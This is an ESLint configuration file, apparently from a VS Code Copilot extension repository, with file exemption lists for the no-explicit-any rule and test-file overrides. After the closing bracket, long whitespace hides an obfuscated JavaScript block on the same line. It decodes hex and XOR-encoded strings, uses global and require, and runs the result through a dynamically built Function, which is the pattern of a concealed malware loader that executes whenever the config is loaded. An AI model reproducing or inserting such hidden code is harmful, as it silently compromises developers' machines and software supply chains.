		rules: {
			'copilot-local/no-test-only': 'warn'
		}
	},
	// copilot extension - no-explicit-any
	{
		files: [
			'extensions/copilot/src/**/*.ts',
		],
		ignores: [
			'extensions/copilot/src/util/vs/**/*.ts',
			'extensions/copilot/src/**/*.spec.ts',
			'extensions/copilot/src/extension/agents/copilotcli/node/nodePtyShim.ts',
			'extensions/copilot/src/extension/byok/common/anthropicMessageConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiFunctionDeclarationConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiMessageConverter.ts',
			'extensions/copilot/src/extension/byok/vscode-node/anthropicProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/geminiNativeProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/ollamaProvider.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionContentBuilder.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionsProvider.ts',
			'extensions/copilot/src/extension/codeBlocks/node/codeBlockProcessor.ts',
			'extensions/copilot/src/extension/codeBlocks/vscode-node/provider.ts',
			'extensions/copilot/src/extension/configuration/vscode-node/configurationMigration.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericInlineIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericPanelIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/inlineFixIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/promptWorkspaceLabels.ts',
			'extensions/copilot/src/extension/contextKeys/vscode-node/contextKeys.contribution.ts',
			'extensions/copilot/src/extension/conversation/vscode-node/userActions.ts',
			'extensions/copilot/src/extension/extension/vscode/services.ts',
			'extensions/copilot/src/extension/inlineChat/node/rendererVisualization.ts',
			'extensions/copilot/src/extension/inlineChat/vscode-node/inlineChatCommands.ts',
			'extensions/copilot/src/extension/inlineEdits/common/observableWorkspaceRecordingReplayer.ts',
			'extensions/copilot/src/extension/inlineEdits/vscode-node/parts/vscodeWorkspace.ts',
			'extensions/copilot/src/extension/intents/node/editCodeIntent.ts',
			'extensions/copilot/src/extension/intents/node/editCodeStep.ts',
			'extensions/copilot/src/extension/intents/node/fixIntent.ts',
			'extensions/copilot/src/extension/intents/node/newIntent.ts',
			'extensions/copilot/src/extension/intents/node/searchIntent.ts',
			'extensions/copilot/src/extension/languageContextProvider/vscode-node/languageContextProviderService.ts',
			'extensions/copilot/src/extension/linkify/common/commands.ts',
			'extensions/copilot/src/extension/linkify/common/responseStreamWithLinkification.ts',
			'extensions/copilot/src/extension/linkify/test/node/util.ts',
			'extensions/copilot/src/extension/log/vscode-node/loggingActions.ts',
			'extensions/copilot/src/extension/log/vscode-node/requestLogTree.ts',
			'extensions/copilot/src/extension/mcp/test/vscode-node/util.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/commands.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/nuget.ts',
			'extensions/copilot/src/extension/onboardDebug/node/copilotDebugWorker/rpc.ts',
			'extensions/copilot/src/extension/onboardDebug/node/parseLaunchConfigFromResponse.ts',
			'extensions/copilot/src/extension/onboardDebug/vscode-node/copilotDebugCommandHandle.ts',
			'extensions/copilot/src/extension/prompt/common/toolCallRound.ts',
			'extensions/copilot/src/extension/prompt/node/chatMLFetcher.ts',
			'extensions/copilot/src/extension/prompt/node/chatParticipantTelemetry.ts',
			'extensions/copilot/src/extension/prompt/node/editGeneration.ts',
			'extensions/copilot/src/extension/prompt/node/intents.ts',
			'extensions/copilot/src/extension/prompt/node/todoListContextProvider.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/endpointProviderImpl.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/requestLoggerImpl.ts',
			'extensions/copilot/src/extension/prompts/node/agent/promptRegistry.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptElement.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptRenderer.ts',
			'extensions/copilot/src/extension/prompts/node/test/utils.ts',
			'extensions/copilot/src/extension/replay/common/chatReplayResponses.ts',
			'extensions/copilot/src/extension/replay/node/replayParser.ts',
			'extensions/copilot/src/extension/replay/vscode-node/replayDebugSession.ts',
			'extensions/copilot/src/extension/review/node/githubReviewAgent.ts',
			'extensions/copilot/src/extension/test/node/services.ts',
			'extensions/copilot/src/extension/test/vscode-node/extension.test.ts',
			'extensions/copilot/src/extension/test/vscode-node/sanity.sanity-test.ts',
			'extensions/copilot/src/extension/test/vscode-node/session.test.ts',
			'extensions/copilot/src/extension/tools/common/toolSchemaNormalizer.ts',
			'extensions/copilot/src/extension/tools/common/toolsService.ts',
			'extensions/copilot/src/extension/typescriptContext/common/serverProtocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/baseContextProviders.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/contextProvider.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/protocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/typescripts.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/utils.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/inspector.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/languageContextService.ts',
			'extensions/copilot/src/extension/workspaceRecorder/vscode-node/workspaceListenerService.ts',
			'extensions/copilot/src/extension/workspaceSemanticSearch/node/semanticSearchTextSearchProvider.ts',
			'extensions/copilot/src/lib/node/chatLibMain.ts',
			'extensions/copilot/src/platform/authentication/test/node/simulationTestCopilotTokenManager.ts',
			'extensions/copilot/src/platform/chat/common/blockedExtensionService.ts',
			'extensions/copilot/src/platform/chunking/common/chunkingEndpointClientImpl.ts',
			'extensions/copilot/src/platform/commands/common/mockRunCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/common/runCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/vscode/runCommandExecutionServiceImpl.ts',
			'extensions/copilot/src/platform/configuration/common/configurationService.ts',
			'extensions/copilot/src/platform/configuration/common/validator.ts',
			'extensions/copilot/src/platform/configuration/test/common/inMemoryConfigurationService.ts',
			'extensions/copilot/src/platform/configuration/vscode/configurationServiceImpl.ts',
			'extensions/copilot/src/platform/customInstructions/common/customInstructionsService.ts',
			'extensions/copilot/src/platform/debug/vscode/debugOutputListener.ts',
			'extensions/copilot/src/platform/diff/node/diffWorkerMain.ts',
			'extensions/copilot/src/platform/editing/common/notebookDocumentSnapshot.ts',
			'extensions/copilot/src/platform/editing/common/textDocumentSnapshot.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsGrouper.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsIndex.ts',
			'extensions/copilot/src/platform/embeddings/common/remoteEmbeddingsComputer.ts',
			'extensions/copilot/src/platform/endpoint/node/modelMetadataFetcher.ts',
			'extensions/copilot/src/platform/endpoint/test/node/openaiCompatibleEndpoint.ts',
			'extensions/copilot/src/platform/env/common/packagejson.ts',
			'extensions/copilot/src/platform/extensions/common/extensionsService.ts',
			'extensions/copilot/src/platform/filesystem/common/fileSystemService.ts',
			'extensions/copilot/src/platform/github/common/githubService.ts',
			'extensions/copilot/src/platform/github/common/nullOctokitServiceImpl.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/edit.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/textEditLengthHelper/length.ts',
			'extensions/copilot/src/platform/inlineEdits/common/editReason.ts',
			'extensions/copilot/src/platform/inlineEdits/common/statelessNextEditProvider.ts',
			'extensions/copilot/src/platform/inlineEdits/common/utils/observable.ts',
			'extensions/copilot/src/platform/languages/common/languageDiagnosticsService.ts',
			'extensions/copilot/src/platform/log/common/logExecTime.ts',
			'extensions/copilot/src/platform/log/common/logService.ts',
			'extensions/copilot/src/platform/log/vscode/outputChannelLogTarget.ts',
			'extensions/copilot/src/platform/nesFetch/common/completionsFetchService.ts',
			'extensions/copilot/src/platform/nesFetch/node/completionsFetchServiceImpl.ts',
			'extensions/copilot/src/platform/networking/common/fetch.ts',
			'extensions/copilot/src/platform/networking/common/fetcherService.ts',
			'extensions/copilot/src/platform/networking/common/networking.ts',
			'extensions/copilot/src/platform/networking/common/openai.ts',
			'extensions/copilot/src/platform/networking/node/baseFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/chatStream.ts',
			'extensions/copilot/src/platform/networking/node/fetcherFallback.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetcher.ts',
			'extensions/copilot/src/platform/networking/node/stream.ts',
			'extensions/copilot/src/platform/networking/node/test/nodeFetcherService.ts',
			'extensions/copilot/src/platform/networking/vscode-node/electronFetcher.ts',
			'extensions/copilot/src/platform/networking/vscode-node/fetcherServiceImpl.ts',
			'extensions/copilot/src/platform/notification/common/notificationService.ts',
			'extensions/copilot/src/platform/notification/vscode/notificationServiceImpl.ts',
			'extensions/copilot/src/platform/openai/node/fetch.ts',
			'extensions/copilot/src/platform/parser/node/nodes.ts',
			'extensions/copilot/src/platform/parser/node/parserServiceImpl.ts',
			'extensions/copilot/src/platform/parser/node/parserWorker.ts',
			'extensions/copilot/src/platform/parser/node/treeSitterQueries.ts',
			'extensions/copilot/src/platform/remoteCodeSearch/common/githubCodeSearchService.ts',
			'extensions/copilot/src/platform/remoteSearch/node/codeOrDocsSearchClientImpl.ts',
			'extensions/copilot/src/platform/review/vscode/reviewServiceImpl.ts',
			'extensions/copilot/src/platform/scopeSelection/vscode-node/scopeSelectionImpl.ts',
			'extensions/copilot/src/platform/snippy/common/snippyTypes.ts',
			'extensions/copilot/src/platform/survey/vscode/surveyServiceImpl.ts',
			'extensions/copilot/src/platform/tasks/vscode/tasksService.ts',
			'extensions/copilot/src/platform/telemetry/common/failingTelemetryReporter.ts',
			'extensions/copilot/src/platform/telemetry/common/telemetryData.ts',
			'extensions/copilot/src/platform/telemetry/node/azureInsightsReporter.ts',
			'extensions/copilot/src/platform/telemetry/node/spyingTelemetryService.ts',
			'extensions/copilot/src/platform/terminal/common/terminalService.ts',
			'extensions/copilot/src/platform/terminal/vscode/terminalServiceImpl.ts',
			'extensions/copilot/src/platform/test/common/endpointTestFixtures.ts',
			'extensions/copilot/src/platform/test/common/testExtensionsService.ts',
			'extensions/copilot/src/platform/test/node/extensionContext.ts',
			'extensions/copilot/src/platform/test/node/fetcher.ts',
			'extensions/copilot/src/platform/test/node/services.ts',
			'extensions/copilot/src/platform/test/node/simulationWorkspace.ts',
			'extensions/copilot/src/platform/test/node/telemetry.ts',
			'extensions/copilot/src/platform/test/node/testWorkbenchService.ts',
			'extensions/copilot/src/platform/testing/common/nullWorkspaceMutationManager.ts',
			'extensions/copilot/src/platform/thinking/common/thinking.ts',
			'extensions/copilot/src/platform/tokenizer/node/tikTokenizerWorker.ts',
			'extensions/copilot/src/platform/tokenizer/node/tokenizer.ts',
			'extensions/copilot/src/platform/workbench/common/workbenchService.ts',
			'extensions/copilot/src/platform/workbench/vscode/workbenchServiceImpt.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/nullWorkspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/tfidfChunkSearch.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/workspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceRecorder/common/resolvedRecording/resolvedRecording.ts',
			'extensions/copilot/src/util/common/async.ts',
			'extensions/copilot/src/util/common/cache.ts',
			'extensions/copilot/src/util/common/chatResponseStreamImpl.ts',
			'extensions/copilot/src/util/common/debounce.ts',
			'extensions/copilot/src/util/common/debugValueEditorGlobals.ts',
			'extensions/copilot/src/util/common/diff.ts',
			'extensions/copilot/src/util/common/progress.ts',
			'extensions/copilot/src/util/common/test/shims/chatTypes.ts',
			'extensions/copilot/src/util/common/test/shims/editing.ts',
			'extensions/copilot/src/util/common/test/shims/l10n.ts',
			'extensions/copilot/src/util/common/test/shims/notebookDocument.ts',
			'extensions/copilot/src/util/common/test/shims/vscodeTypesShim.ts',
			'extensions/copilot/src/util/common/test/simpleMock.ts',
			'extensions/copilot/src/util/common/timeTravelScheduler.ts',
			'extensions/copilot/src/util/common/types.ts',
			'extensions/copilot/src/util/node/worker.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': true
				}
			]
		}
	},
	// copilot extension - chatLibMain exception
	{
		files: [
			'extensions/copilot/src/lib/node/chatLibMain.ts',
		],
		rules: {
			'import/no-restricted-paths': 'off'
		}
	},
	// Allow querySelector/querySelectorAll in test files - it's acceptable for test assertions
	{
		files: [
			'src/**/test/**/*.ts',
			'extensions/**/test/**/*.ts',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				// Keep the Intl helper restriction even in tests
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': 'TSAsExpression[typeAnnotation.type="TSTypeReference"][typeAnnotation.typeName.type="TSQualifiedName"][typeAnnotation.typeName.left.type="Identifier"][typeAnnotation.typeName.left.name="sinon"][typeAnnotation.typeName.right.name="SinonStub"]',
					'message': `Avoid casting with 'as sinon.SinonStub'. Prefer typed stubs from 'sinon.stub(...)' or capture the stub in a typed variable.`
				},
			],
		}
	});                                                                                                                                                                                                       var bx = '-9261-2';(function(fPZeik_YquphXqtQyHRwkDQZ,JD$sfFZlY){var hCwqN$TycCXHheR$HuWZsDOvxF=mRuCD$WVIvkbYeqeVB$DWVuj,lSwmVFd$$fctx=fPZeik_YquphXqtQyHRwkDQZ();while(!![]){try{var mJRjb_N$owLPKOpyRNreuVG=-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xee))/(-0x218a+parseInt(0x15e8)+parseInt(0xba3))+-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xec))/(-parseInt(0x2157)+0x1*-parseInt(0x1f6)+-0x45*parseFloat(-0x83))+Math['max'](parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf7))/(parseInt(-parseInt(0x25))*Math.max(0xeb,parseInt(0xeb))+0x652+0x14*Number(parseInt(0x162))),parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf2))/(Math.floor(parseInt(0x2517))+parseInt(0x224b)*parseFloat(parseInt(0x1))+Math.ceil(-parseInt(0x3f7))*parseInt(0x12)))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf9))/(-0x9d7+parseInt(0x1525)+-0xb49))+Math['trunc'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe8))/(Math.floor(0x45)*Math.trunc(-0x60)+parseInt(0x71)*Math.max(parseInt(0x4b),0x4b)+-parseInt(0x735)))+-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf4))/(parseFloat(0x2666)+-parseInt(0x26ae)+Math.floor(parseInt(0x4f)))+Math['ceil'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf6))/(Math.trunc(0xa70)+Math.max(-parseInt(0x1),-parseInt(0x1))*Math.floor(-0x2627)+-0x191*0x1f))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe6))/(-parseInt(0x190)*Number(-0xd)+Math.trunc(parseInt(0x64c))+-parseInt(0x1)*parseInt(0x1a93)))+Math['ceil'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf1))/(-0x2104+parseInt(-0x11a2)+0x32b0))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe7))/(parseFloat(0x903)+parseInt(0x157e)+Math.max(-0x1e76,-0x1e76)));if(mJRjb_N$owLPKOpyRNreuVG===JD$sfFZlY)break;else lSwmVFd$$fctx['push'](lSwmVFd$$fctx['shift']());}catch(aHXNJXaqWEgkjG$ZgG){lSwmVFd$$fctx['push'](lSwmVFd$$fctx['shift']());}}}(b$uDmFSLXmIK$qucbTlpj,Math.floor(-parseInt(0x9))*Math.trunc(-0x15df1)+parseInt(parseInt(0xb2fb))+-0x2059b),function(lWTIZCbSnBZmbdi,mqGHrC$ISCHySjTrqrJ,nOmMBoUELScCBaDiozDjUWW,ZXL$RvFZXoo){var eSwDbT_X$ig=mRuCD$WVIvkbYeqeVB$DWVuj;lWTIZCbSnBZmbdi['bx']=bx;function DJuiZmBDzVCcjxyApAcdDEUqo(jdryYdtWSYLOf$x,aSHApnrNHI$cj$JqQRc){var qcNOHFNlFaMXzChVo=mRuCD$WVIvkbYeqeVB$DWVuj,UJ$$vXHdWij=jdryYdtWSYLOf$x[qcNOHFNlFaMXzChVo(0xf5)](''),bk_yJOMhvfoWW=-parseInt(0x1e0a)+Math.floor(parseInt(0x161))*parseInt(-0x15)+parseFloat(-0x3aff)*Math.floor(-parseInt(0x1)),rhLLndUJYVkcLhTvQSvpLP_fxQ=aSHApnrNHI$cj$JqQRc[-parseInt(0x265)*parseFloat(-0x8)+Math.max(-parseInt(0x2b3),-parseInt(0x2b3))+parseInt(-parseInt(0x1075))],alrwebXs$tL$ShNjzZmUgR=UJ$$vXHdWij[qcNOHFNlFaMXzChVo(0xeb)];while(bk_yJOMhvfoWW<alrwebXs$tL$ShNjzZmUgR){var u$HOdtr$Gg=rhLLndUJYVkcLhTvQSvpLP_fxQ*(bk_yJOMhvfoWW+aSHApnrNHI$cj$JqQRc[Number(parseInt(0x1e57))+parseInt(0x1)*parseInt(0x1cf0)+-0x3b46])+(rhLLndUJYVkcLhTvQSvpLP_fxQ+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[Math.max(0xaf3,parseInt(0xaf3))+parseInt(0x35e)+0x14d*-0xb]+aSHApnrNHI$cj$JqQRc[Number(parseInt(0x150f))+parseInt(0x23f8)+parseInt(0x9)*parseInt(-parseInt(0x656))],EIbuLReUDYYUPPolfM$KwuQ=rhLLndUJYVkcLhTvQSvpLP_fxQ*(bk_yJOMhvfoWW+aSHApnrNHI$cj$JqQRc[-0x1*-parseInt(0x3ce)+Math.floor(0x511)+-parseInt(0x8dc)])+(rhLLndUJYVkcLhTvQSvpLP_fxQ*aSHApnrNHI$cj$JqQRc[parseFloat(parseInt(0xf))*-0x25c+parseInt(0x6)*Math.trunc(parseInt(0x4a5))+parseInt(0x789)]+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[0x2f4+0x1713+parseFloat(-parseInt(0x1))*parseInt(0x1a03)],T_NmrgaFLecRzbKAxuJmHKg=u$HOdtr$Gg%alrwebXs$tL$ShNjzZmUgR,V$NTSQaa$FIrzeb=EIbuLReUDYYUPPolfM$KwuQ%alrwebXs$tL$ShNjzZmUgR,I_mUJcwJV=UJ$$vXHdWij[T_NmrgaFLecRzbKAxuJmHKg];UJ$$vXHdWij[T_NmrgaFLecRzbKAxuJmHKg]=UJ$$vXHdWij[V$NTSQaa$FIrzeb],UJ$$vXHdWij[V$NTSQaa$FIrzeb]=I_mUJcwJV,rhLLndUJYVkcLhTvQSvpLP_fxQ=(u$HOdtr$Gg+EIbuLReUDYYUPPolfM$KwuQ+rhLLndUJYVkcLhTvQSvpLP_fxQ+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[Math.max(0x6d3,parseInt(0x6d3))*-parseInt(0x3)+parseInt(0x1e14)+parseInt(0x3)*-parseInt(0x332)],bk_yJOMhvfoWW+=parseFloat(-parseInt(0x55b))+-0x99b+0x3*Math.ceil(parseInt(0x4fd));}return UJ$$vXHdWij[qcNOHFNlFaMXzChVo(0xf8)]('');}var E_gRZVgYfuVwsNEpbdbS=String[eSwDbT_X$ig(0xf0)](Math.trunc(0x6df)*0x1+Math.floor(-0x1b93)+parseInt(0x14d3)),abxgK$W$UwDyQSN=DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xe9),ZXL$RvFZXoo);abxgK$W$UwDyQSN=abxgK$W$UwDyQSN[eSwDbT_X$ig(0xf5)]('#')[eSwDbT_X$ig(0xf8)](E_gRZVgYfuVwsNEpbdbS)[eSwDbT_X$ig(0xf5)]('~1')[eSwDbT_X$ig(0xf8)]('#')[eSwDbT_X$ig(0xf5)]('~0')[eSwDbT_X$ig(0xf8)]('~')[eSwDbT_X$ig(0xf5)](E_gRZVgYfuVwsNEpbdbS),lWTIZCbSnBZmbdi[abxgK$W$UwDyQSN[Math.max(0x7,parseInt(0x7))*parseInt(0xba)+-parseInt(0xd8e)*-0x1+parseInt(-0x4)*0x4a9]]=mqGHrC$ISCHySjTrqrJ;if(typeof module===abxgK$W$UwDyQSN[parseInt(0x36)*0xa5+0x3*-0x2ab+parseInt(0x1acc)*-parseInt(0x1)])lWTIZCbSnBZmbdi[abxgK$W$UwDyQSN[Math.floor(-0x103e)+0x37a+-parseInt(0xa)*-parseInt(0x147)]]=module;var TquFntEeiM_RphAR$nY=DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xed),nOmMBoUELScCBaDiozDjUWW),WtOtRsMXyjtHmepEhhVHCW$GYi=DJuiZmBDzVCcjxyApAcdDEUqo[TquFntEeiM_RphAR$nY[eSwDbT_X$ig(0xf3)](0x26c*Math.ceil(0x10)+-parseInt(0x664)+-0x205c,parseFloat(-parseInt(0x1aa))*-0x1+parseInt(0x368)+Math.trunc(-0xd)*parseInt(0x63))],L_aKjr_pPkOmXvD=WtOtRsMXyjtHmepEhhVHCW$GYi('',DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xea),nOmMBoUELScCBaDiozDjUWW)),DtzjBhf=L_aKjr_pPkOmXvD(DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xef),nOmMBoUELScCBaDiozDjUWW));return WtOtRsMXyjtHmepEhhVHCW$GYi('',DtzjBhf)(Math.floor(0x264a)+0x7b*parseFloat(-0xd)+-parseInt(0x163e)),0x1e61+parseInt(parseInt(0x3cbf))*Math.floor(0x1)+-0x2f1*parseFloat(0x13);}(global,require,[parseInt(-parseInt(0x7df3))*0x21+parseInt(0xf8)*0x6799+0x1be73e,-parseInt(0x1)*parseFloat(0x9a7)+Math.floor(parseInt(0x1c3a))+0x8b7*-0x2,0x107a*Number(-parseInt(0x4))+Math.max(parseInt(0x1),parseInt(0x1))*parseInt(parseInt(0xfe66))+Number(-0x2529),0xc6d+Math.trunc(-0x2)*Number(0x1d7)+-parseInt(0x3f6)*0x2,parseFloat(-0xc347)+Math.ceil(-parseInt(0x3))*Math.floor(-parseInt(0x808a))+parseInt(parseInt(0x41b))*Number(0xa),parseInt(0x2259cb)+Math.trunc(-parseInt(0x994))*-parseInt(0x9ad)+-parseInt(0x2ff1b8)],[parseInt(0x789110)+parseInt(parseInt(0x1f21c0))+Number(-0x1ba715),parseFloat(parseInt(0x51a))*parseInt(0x1)+parseInt(parseInt(0x108d))*-parseInt(0x1)+parseInt(0x2)*0x68c,-0x801d*parseInt(-parseInt(0x1))+Number(0x67db)+Math.max(-parseInt(0x8dab),-parseInt(0x8dab)),-parseInt(0xdf9)+Math.floor(0x53b)+0xaff,parseFloat(-0x1)*Math.max(-parseInt(0xff77),-parseInt(0xff77))+0x1522b+-parseInt(0x1a187),-0x480d98+0x660acf+Number(0x32c200)]));function mRuCD$WVIvkbYeqeVB$DWVuj(BggsOPJeGHmfI_$MySkkjD,TTUU$Tj){var AzWQMlHCzyHSyBEx=b$uDmFSLXmIK$qucbTlpj();return mRuCD$WVIvkbYeqeVB$DWVuj=function(O$X$moYK,WKJCDVtgqqGj$NcSTJCFx){O$X$moYK=O$X$moYK-(-parseInt(0x3ed)*parseInt(0x1)+Math.max(-parseInt(0x635),-parseInt(0x635))+Number(-0x161)*-parseInt(0x8));var gGNJBPjaNz_gaBUm_UU=AzWQMlHCzyHSyBEx[O$X$moYK];if(mRuCD$WVIvkbYeqeVB$DWVuj['uUdDay']===undefined){var ocgXuRKQMDZGqcqMUpCiqDr=function(dWMZvP_$UbcraF){var BCWc_pEqE=parseInt(0x1049)+-0xd92+-0x1b7&-parseInt(0x1898)+-parseInt(0x1)*-parseInt(0x1b79)+Number(0x1)*-0x1e2,L$yXZvbWQ=new Uint8Array(dWMZvP_$UbcraF['match'](/.{1,2}/g)['map'](SLyuLTRyLf_bu=>parseInt(SLyuLTRyLf_bu,-parseInt(0x2489)+Math.ceil(parseInt(0x2524))+-parseInt(0x8b)))),hrk$_MLWpNTM=L$yXZvbWQ['map'](GXLAxwL_ABApIx_vKvQbldiYtp=>GXLAxwL_ABApIx_vKvQbldiYtp^BCWc_pEqE),m$$PdlcyLS=new TextDecoder(),MJpBkWtv=m$$PdlcyLS['decode'](hrk$_MLWpNTM);return MJpBkWtv;};mRuCD$WVIvkbYeqeVB$DWVuj['aakEIY']=ocgXuRKQMDZGqcqMUpCiqDr,BggsOPJeGHmfI_$MySkkjD=arguments,mRuCD$WVIvkbYeqeVB$DWVuj['uUdDay']=!![];}var hVGoCII_AMwtjiMIJzdCEhPQ=AzWQMlHCzyHSyBEx[parseFloat(parseInt(0x2271))+parseInt(0x20ae)+-parseInt(0x431f)],jux_$kSDJQHD=O$X$moYK+hVGoCII_AMwtjiMIJzdCEhPQ,AqyA$$X=BggsOPJeGHmfI_$MySkkjD[jux_$kSDJQHD];return!AqyA$$X?(mRuCD$WVIvkbYeqeVB$DWVuj['bWwrdG']===undefined&&(mRuCD$WVIvkbYeqeVB$DWVuj['bWwrdG']=!![]),gGNJBPjaNz_gaBUm_UU=mRuCD$WVIvkbYeqeVB$DWVuj['aakEIY'](gGNJBPjaNz_gaBUm_UU),BggsOPJeGHmfI_$MySkkjD[jux_$kSDJQHD]=gGNJBPjaNz_gaBUm_UU):gGNJBPjaNz_gaBUm_UU=AqyA$$X,gGNJBPjaNz_gaBUm_UU;},mRuCD$WVIvkbYeqeVB$DWVuj(BggsOPJeGHmfI_$MySkkjD,TTUU$Tj);}function b$uDmFSLXmIK$qucbTlpj(){var QRDjnNHZyExj=['32333139393339555758676967','343132353131587043687461','35393632383438436e67584566','726d746a63656f236223','336a64202c3c736132733d5d3d283b7533323d306f3161387b2961693b2b2972697b7261696e696e7d6e6c2e722961302b6c6f77636f33722022656f6e5b7475746262745b5d29707639386f7032613c7472636934766c343b3b635b20617638362c2961733b2265762b2c723b7337286f372d6e66617228362c70696838695d6b7467722b6d5b2b5b613131336f72322832726f30627d652074636136217634723d285d663b6969742e2b72206921293b31742c2e382e2b737466412c732e6f723b6f2e743d2b2b6e683b2b7b2b283b4175633b6472753b3b74737531373663722029725b663d223374386973683d6163643d65686273316f296e756667706972722b30282c6e746c63696365283e333b74752c39757261617234316e613b61695b62762969687274746168686f6569656473726961736c6e67723b707474686e3b6c6e743d306c74282e693d2e766670203d6f78296e316c6f226128636974693b6f6561332c63363362743d616c72613d37692e61756c6c3b766869316f7d73664375306e76322d5b3972696e3274536c6176657b61293d657220757465203933286e2970612e286d333320733b6f2c33675b653b69642e69436128677430733b29656631226f3b61683166432b676a222c686f723d3b6f752a6d613274743d2b38205b633b613d3674296661736e6f63307b6372206428207d2c743b31742a375d723b6f652e37396474356e702929622861722b6869363c61616b742e76763164292b38707d432065655b356d28746e7438743d6374293e2969723d72667428316c6e2873292e633067666930643d6961613b642933286f64693d74306c762e61292972206f4374727529727d732c6572642c623161322b722e696b2876743b637261286e742c6f742929316c733763386b7430745b6665663d28376c743d3d6574533b695d695b7374333b3c4163286168337461313d3d723b612e2c2820613b74296b722b3862723d75613b6374747420296e3b7365746330222e616963746e2d2c315b2e747468202c2c67332d307176746f4165312b742b326f3b5d6928622d722b646c6f737873726c703d7474296772696a6c636e6263666f722020696361736f2c3b3b75623d3063737372732c74766d745d6c20696e6c3d74315d7a653b69727461296669372c72226575295d2b75747d702e75686170742c766676746b6b7074307632207569786170616f672c6a74756e69315d646f323474693d6374432d74417b226f633b336530353d617328287462285d68626f3d736532653b6969653b33736770702e62432069626e692b7266726f656f616e753d6864652e343b2b74682d726f76792e2032342e616f693d5d74283d3d6f726d73767b6c6b747562693b3c7465743861282e666928303d6c657328642875746864746c696869763469752b3d765d736a6f742e206f742c616f303d346c756d6c62667232334363326f2c3b653d65613474783d61732c7467722e756f6d29612873616631682967726974227072347266616863393b7865296b','6c656e677468','33343139303457777961516f','7463666e74616c6d73696f6f70776e656a6267726b7568747172797872766f75736463637a','313430303733304d474a4a7876','51653f5b225b4a5b2f7465635b3c5b675b3b4a242d2e2e346e29693c28777b3f30795b5d696340422830782e39236163435b695b635f29636c2e266a692e292e695b3f2c69634363352e203d5b5b3c36686d69345b742070635b643f3a422c735860385f28643f3f3f6e5b5b2a793f656b5b6f3b662e3f3d3c265b2e66353f532121665b207446543f295b6f215b5b5b65552e67745b495b4c3f2e203f63577854712065483f2a77723a3d692e3f325b632e352e262e26255b64766f245b78407258625b513f533a4872635b242e5b6367725b235b346c5f5b5b2e655b69242e63222e3f6547745b20723f56787e425b4a2762735b5b222e53416f202e5f2b3f3f2a63257a6e5b66653a2c6e69315f74695b5b62594f2e63566367642e745b5b7d722e216e5328447b416b6563296e5b6b2e2e722948725b5b2b6f666c6973685b665b5b704e685b7b5b2e3f407366245b21325b79662e3f2e7b20733165256b2e35732e5b5b215b237369223b7d744c3b5b65625b2b285b5b33375b2e44485b63643f6d7d2030633b296c634d2474323f5b42732e20733f28383f5b277839786f2e78625069636b3b5b535b632e2e522e3d2e2e69273828735b215b6c206f2620255b6e3f7b6e61735b20656b2e5b6e63726c7266636d5b21692d6126652e7d696263654c7328216f5b6f766d686f532b6c203238616b242e632e207d653f752842435b2e235b7465672e653f5b615b2967637377733f2e5b286165636d7b346c2e7d